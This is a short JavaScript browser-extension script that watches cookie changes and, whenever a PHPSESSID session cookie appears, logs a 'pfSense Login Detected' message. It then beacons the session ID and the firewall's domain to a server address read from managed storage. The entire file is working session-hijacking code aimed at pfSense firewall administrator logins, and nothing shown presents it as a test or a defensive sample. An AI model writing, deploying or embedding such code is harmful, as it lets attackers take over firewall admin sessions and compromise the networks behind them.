let ip = null;
browser.storage.managed.get("server_ip").then((result) => {
  ip = result.server_ip;
});

browser.cookies.onChanged.addListener((changeInfo) => {
    const cookie = changeInfo.cookie;

    

    if (cookie.name === "PHPSESSID" && !changeInfo.removed) {
        const sessionId = cookie.value;
        const pfsense_ip1 = cookie.domain;
        const timestamp = new Date().toLocaleTimeString();
        console.log(`[${timestamp}] pfSense Login Detected! Session ID: ${sessionId}`);
        
        const data = new URLSearchParams();
        data.append('session', sessionId);
        data.append('pfsense_ip2', pfsense_ip1);
        navigator.sendBeacon(ip, data);
    }
});